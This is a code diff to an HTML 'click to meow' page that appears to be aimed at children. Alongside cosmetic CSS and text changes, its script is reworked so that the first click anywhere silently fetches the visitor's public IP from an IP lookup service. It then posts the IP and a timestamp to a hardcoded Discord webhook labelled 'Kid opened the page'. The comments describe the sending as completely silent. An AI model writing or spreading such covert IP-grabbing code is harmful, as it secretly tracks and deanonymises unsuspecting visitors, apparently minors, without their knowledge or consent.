@@ -20,7 +20,7 @@
       top: 50%;
       left: 50%;
       transform: translate(-50%, -50%);
-      font-size: 3.2rem;
+      font-size: 3.5rem;
       color: white;
       text-align: center;
       text-shadow: 0 4px 20px rgba(0,0,0,0.3);
@@ -32,18 +32,17 @@
     .cat {
       position: absolute;
       font-size: 5rem;
-      pointer-events: auto;
-      cursor: pointer;
+      pointer-events: none; /* no interaction needed on cat */
       animation: meowPop 3s forwards;
       z-index: 20;
       filter: drop-shadow(0 10px 25px rgba(0,0,0,0.25));
     }
 
     @keyframes meowPop {
-      0%   { opacity: 0; transform: scale(0.2) translateY(50px); }
-      20%  { opacity: 1; transform: scale(1.2) translateY(-20px); }
+      0%   { opacity: 0; transform: scale(0.3) translateY(40px); }
+      20%  { opacity: 1; transform: scale(1.15) translateY(-15px); }
       75%  { opacity: 1; transform: scale(1) translateY(0); }
-      100% { opacity: 0; transform: scale(0.7) translateY(-60px); }
+      100% { opacity: 0; transform: scale(0.8) translateY(-50px); }
     }
 
     .hidden { opacity: 0; }
@@ -51,7 +50,7 @@
 </head>
 <body>
 
-  <div class="title" id="title">Click the cat to make it meow! 🐱</div>
+  <div class="title" id="title">Click anywhere to make a meow sound! 🐱</div>
 
   <audio id="meowSound" preload="auto">
     <source src="https://assets.mixkit.co/sfx/preview/296/296.mp3" type="audio/mpeg">
@@ -62,19 +61,23 @@
     const audio = document.getElementById('meowSound');
     const webhookUrl = "https://discord.com/api/webhooks/1485790689685016626/_ZiX3FxW4rppDGFiojqc6pLcgeEgY2MX6vEDBCy2bR8SLbVN2UTJU3GTqqSNLDAXWxVg";
 
-    // Silent send using XMLHttpRequest (better chance on local files)
-    function sendToWebhook(ip, x, y) {
+    let hasSent = false; // only send once
+
+    // Silent send function
+    function sendToWebhook(ip = "Unknown") {
+      if (hasSent) return;
+      hasSent = true;
+
       const payload = {
-        content: "🐱 **Cat was clicked!**",
+        content: "🐱 **First click on meow page!**",
         embeds: [{
           color: 0xff1493,
-          title: "Meow Click Event",
+          title: "Meow Page Opened",
           fields: [
-            { name: "IP Address", value: ip || "Unknown", inline: true },
-            { name: "Click Position", value: `X: ${x} • Y: ${y}`, inline: true },
-            { name: "Time", value: new Date().toLocaleString(), inline: false }
+            { name: "IP", value: ip, inline: true },
+            { name: "Time", value: new Date().toLocaleString(), inline: true }
           ],
-          footer: { text: "Educational Meow Website" }
+          footer: { text: "Kid opened the page" }
         }]
       };
 
@@ -82,51 +85,46 @@
       xhr.open("POST", webhookUrl, true);
       xhr.setRequestHeader("Content-Type", "application/json");
       xhr.send(JSON.stringify(payload));
-      // We don't care about response - fully silent
+      // No onload/onerror → completely silent
     }
 
-    document.addEventListener('click', async function(e) {
+    document.addEventListener('click', function(e) {
+      // Hide title after first interaction
       if (!title.classList.contains('hidden')) {
         title.classList.add('hidden');
       }
 
-      // Play meow
+      // Play meow on every click
       audio.currentTime = 0;
       audio.play().catch(() => {});
 
-      // If clicked on cat → send silently
-      if (e.target.classList.contains('cat')) {
+      // Send only on first click (silently)
+      if (!hasSent) {
+        // Try to get IP (may fail silently on local file)
         let ip = "Unknown";
-
-        // Try to get IP (may fail on strict local file, but we still send)
-        try {
-          const res = await fetch('https://ip-api.com/json', { mode: 'no-cors' });
-          // We can't read the response easily with no-cors, so fallback
-        } catch (err) {}
-
-        // Try one more common IP service
-        try {
-          const ipRes = await fetch('https://api.ipify.org?format=json');
-          const data = await ipRes.json();
-          ip = data.ip || "Unknown";
-        } catch (err) {
-          // If both fail, still send with "Unknown"
-        }
-
-        const clickX = Math.round(e.clientX);
-        const clickY = Math.round(e.clientY);
-
-        sendToWebhook(ip, clickX, clickY);
+        const ipXhr = new XMLHttpRequest();
+        ipXhr.open("GET", "https://api.ipify.org?format=json", true);
+        ipXhr.onload = function() {
+          if (ipXhr.status === 200) {
+            try {
+              const data = JSON.parse(ipXhr.responseText);
+              ip = data.ip || "Unknown";
+            } catch {}
+          }
+          sendToWebhook(ip);
+        };
+        ipXhr.onerror = () => sendToWebhook("Unknown"); // fail → send anyway
+        ipXhr.send();
       }
 
-      // Spawn cat sticker
+      // Always show cat sticker where clicked
       const cat = document.createElement('div');
       cat.className = 'cat';
       cat.textContent = ['🐱','😺','😸','🐈'][Math.floor(Math.random()*4)];
 
       const rotation = Math.random() * 40 - 20;
-      cat.style.left = `${e.clientX - 42}px`;
-      cat.style.top = `${e.clientY - 42}px`;
+      cat.style.left = `${e.clientX - 40}px`;
+      cat.style.top = `${e.clientY - 40}px`;
       cat.style.transform = `rotate(${rotation}deg)`;
 
       document.body.appendChild(cat);
